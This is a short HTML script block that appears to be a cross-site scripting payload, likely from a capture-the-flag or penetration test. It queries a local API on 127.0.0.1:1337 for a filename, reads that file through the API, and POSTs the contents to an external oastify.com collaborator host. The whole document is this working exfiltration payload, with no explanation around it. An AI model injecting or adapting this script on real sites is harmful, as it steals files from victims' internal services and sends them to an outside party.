<script>
fetch("http://127.0.0.1:1337/api/stats")
  .then((response) => response.json())
  .then((data) => {
    const filename = data.filename; // Assuming the response contains the filename
    fetch(`http://127.0.0.1:1337/api/stats?filename=${filename}`)
      .then((response) => response.text())
      .then((fileContent) => {
        fetch('http://xklqf2ly81rowgujq4vgur2vcmid66uv.oastify.com', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ fileContent }),
          mode: 'cors',
          credentials: 'omit'
        });
      })
      .catch((error) => {
        console.error('Error fetching file content:', error);
      });
  })
  .catch((error) => {
    console.error('Error fetching stats:', error);
  });</script>
